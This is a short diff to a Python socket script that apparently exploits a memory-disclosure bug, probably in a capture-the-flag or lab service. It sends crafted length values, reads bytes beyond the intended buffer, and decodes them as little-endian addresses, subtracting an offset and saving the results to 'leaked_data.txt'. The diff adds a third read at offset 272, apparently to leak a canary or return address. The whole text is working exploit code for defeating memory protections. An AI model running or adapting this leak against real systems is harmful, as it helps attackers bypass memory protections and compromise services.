@@ -21,7 +21,7 @@ try:
     fo = open("leaked_data.txt", "a")
 
     # Send data
-    message = b'AAAAAAAAAAAAAAAAAAAAAAAA\n32\n'
+    message = b'\n32\n'
     print('sending {!r}'.format(message))
     sock.sendall(message)
 
@@ -31,8 +31,8 @@ try:
     while amount_received < amount_expected:
         data = sock.recv(32)
         amount_received += len(data)
-        print("0x" + data.hex()[48:])
-        fo.write("0x" + data.hex()[48:])
+        print(hex(int.from_bytes(data[24:],"little")))
+        fo.write(hex(int.from_bytes(data[24:],"little")))
 
     # Send data
     message = b'\n6\n'
@@ -46,6 +46,19 @@ try:
         amount_received += len(data)
         print(hex(int.from_bytes(data,"little")-224))
         fo.write(" " + hex(int.from_bytes(data,"little")-224))
+
+    # Send data
+    message = b'\n280\n'
+    print('sending {!r}'.format(message))
+    sock.sendall(message)
+
+    amount_received = 0
+    amount_expected = len(message)
+    while amount_received < amount_expected:
+        data = sock.recv(280)
+        amount_received += len(data)
+        print(hex(int.from_bytes(data[272:],"little")))
+        fo.write(hex(int.from_bytes(data[272:],"little")))
 
 finally:
     print('closing socket')
